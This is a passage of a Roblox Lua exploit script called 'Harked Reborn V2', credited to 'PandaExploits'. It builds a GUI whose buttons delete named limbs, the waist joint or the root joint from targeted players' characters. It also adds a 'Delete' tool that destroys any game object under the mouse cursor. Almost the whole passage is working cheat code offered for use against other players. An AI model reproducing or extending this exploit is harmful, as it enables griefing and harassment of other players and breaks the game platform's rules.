			Destroy(Players[v].Character["Left Arm"])
		else
			Destroy(Players[v].Character["LeftUpperArm"])
		end
	end
end)

noll.Name = "noll"
noll.Parent = ScrollingFrame
noll.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
noll.BackgroundTransparency = 0.500
noll.BorderSizePixel = 0
noll.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
noll.Size = UDim2.new(0, 131, 0, 40)
noll.Font = Enum.Font.SourceSansLight
noll.Text = "Noll"
noll.TextColor3 = Color3.fromRGB(255, 255, 255)
noll.TextSize = 23.000
noll.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
			Destroy(Players[v].Character["Left Leg"])
		else
			Destroy(Players[v].Character["LeftUpperLeg"])
		end
	end
end)

nora.Name = "nora"
nora.Parent = ScrollingFrame
nora.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
nora.BackgroundTransparency = 0.500
nora.BorderSizePixel = 0
nora.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
nora.Size = UDim2.new(0, 131, 0, 40)
nora.Font = Enum.Font.SourceSansLight
nora.Text = "Nora"
nora.TextColor3 = Color3.fromRGB(255, 255, 255)
nora.TextSize = 23.000
nora.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
			Destroy(Players[v].Character["Right Arm"])
		else
			Destroy(Players[v].Character["RightUpperArm"])
		end
	end
end)

norl.Name = "norl"
norl.Parent = ScrollingFrame
norl.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
norl.BackgroundTransparency = 0.500
norl.BorderSizePixel = 0
norl.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
norl.Size = UDim2.new(0, 131, 0, 40)
norl.Font = Enum.Font.SourceSansLight
norl.Text = "Norl"
norl.TextColor3 = Color3.fromRGB(255, 255, 255)
norl.TextSize = 23.000
norl.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
			Destroy(Players[v].Character["Right Leg"])
		else
			Destroy(Players[v].Character["RightUpperLeg"])
		end
	end
end)

nowaist.Name = "nowaist"
nowaist.Parent = ScrollingFrame
nowaist.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
nowaist.BackgroundTransparency = 0.500
nowaist.BorderSizePixel = 0
nowaist.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
nowaist.Size = UDim2.new(0, 131, 0, 40)
nowaist.Font = Enum.Font.SourceSansLight
nowaist.Text = "Nowaist"
nowaist.TextColor3 = Color3.fromRGB(255, 255, 255)
nowaist.TextSize = 23.000
nowaist.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
			Destroy(Players[v].Character.UpperTorso.Waist)
		end
	end
end)

noroot.Name = "noroot"
noroot.Parent = ScrollingFrame
noroot.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
noroot.BackgroundTransparency = 0.500
noroot.BorderSizePixel = 0
noroot.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
noroot.Size = UDim2.new(0, 131, 0, 40)
noroot.Font = Enum.Font.SourceSansLight
noroot.Text = "Noroot"
noroot.TextColor3 = Color3.fromRGB(255, 255, 255)
noroot.TextSize = 23.000
noroot.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
			Destroy(Players[v].Character.LowerTorso.Root)
		end
	end
end)

top_2.Name = "top"
top_2.Parent = top
top_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
top_2.BackgroundTransparency = 1.000
top_2.Position = UDim2.new(0.154639184, 0, -0.333333343, 0)
top_2.Size = UDim2.new(0, 200, 0, 50)
top_2.Font = Enum.Font.SourceSansLight
top_2.Text = "Harked Reborn V2"
top_2.TextColor3 = Color3.fromRGB(255, 255, 255)
top_2.TextSize = 45.000

credits.Name = "credits"
credits.Parent = top
credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
credits.BackgroundTransparency = 1.000
credits.Position = UDim2.new(0, 0, 1, 0)
credits.Size = UDim2.new(0, 291, 0, 23)
credits.Font = Enum.Font.SourceSansLight
credits.Text = "Script by PandaExploits#3098, UI by Unverified"
credits.TextColor3 = Color3.fromRGB(255, 255, 255)
credits.TextSize = 17.000
credits.TextWrapped = true

queue.Name = "queue"
queue.Parent = top
queue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
queue.BackgroundTransparency = 1.000
queue.Position = UDim2.new(0, 0, 10.0333338, 0)
queue.Size = UDim2.new(0, 292, 0, 23)
queue.Font = Enum.Font.SourceSans
queue.Text = "Reborn by PandaExploits#3098 (Mobile supported i think)   SLOCK: false"
queue.TextColor3 = Color3.fromRGB(255, 0, 4)
queue.TextSize = 20.000
queue.TextWrapped = true

target.Name = "target"
target.Parent = top
target.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
target.BackgroundTransparency = 0.400
target.Position = UDim2.new(0.0206185561, 0, 8.86666584, 0)
target.Size = UDim2.new(0, 278, 0, 33)
target.Font = Enum.Font.SourceSans
target.Text = ""
target.TextColor3 = Color3.fromRGB(255, 255, 255)
target.TextSize = 23.000

local selectionbox = Instance.new("SelectionBox", workspace)
local equipped = false
local oldmouse = mouse.Icon
local destroytool = Instance.new("Tool", Players.LocalPlayer:FindFirstChildOfClass("Backpack"))
destroytool.RequiresHandle = false
destroytool.Name = "Delete"
destroytool.ToolTip = "from Harked Reborn V2"
destroytool.TextureId = "http://www.roblox.com/asset/?id=12223874"
destroytool.CanBeDropped = false
destroytool.Equipped:connect(function()
	equipped = true
	mouse.Icon = "rbxasset://textures\\HammerCursor.png"
	while equipped do
		selectionbox.Adornee = mouse.Target
		wait()
	end
end)
destroytool.Unequipped:connect(function()
	equipped = false
	selectionbox.Adornee = nil
	mouse.Icon = oldmouse
	print(oldmouse)
end)
destroytool.Activated:connect(function()
	local explosion = Instance.new("Explosion", workspace)
	explosion.BlastPressure = 0
	explosion.BlastRadius = 0
	explosion.DestroyJointRadiusPercent = 0
	explosion.ExplosionType = Enum.ExplosionType.NoCraters
	explosion.Position = mouse.Target.Position
	Destroy(mouse.Target)
end)
game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', true)
Players.LocalPlayer.CharacterAdded:connect(function()
	local destroytool = Instance.new("Tool", Players.LocalPlayer:FindFirstChildOfClass("Backpack"))
	destroytool.RequiresHandle = false
	destroytool.Name = "Delete"
	destroytool.ToolTip = "from Harked Reborn V2"
	destroytool.TextureId = "http://www.roblox.com/asset/?id=12223874"
	destroytool.CanBeDropped = false
	destroytool.Equipped:connect(function()
		equipped = true
		mouse.Icon = "rbxasset://textures\\HammerCursor.png"
		while equipped do
			selectionbox.Adornee = mouse.Target
			wait()
		end
	end)
	destroytool.Unequipped:connect(function()
		equipped = false
		selectionbox.Adornee = nil
		mouse.Icon = oldmouse
		print(oldmouse)
	end)
	destroytool.Activated:connect(function()
		local explosion = Instance.new("Explosion", workspace)
		explosion.BlastPressure = 0
		explosion.BlastRadius = 0
		explosion.DestroyJointRadiusPercent = 0
		explosion.ExplosionType = Enum.ExplosionType.NoCraters
		explosion.Position = mouse.Target.Position
		Destroy(mouse.Target)
	end)
	game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', true)
end)
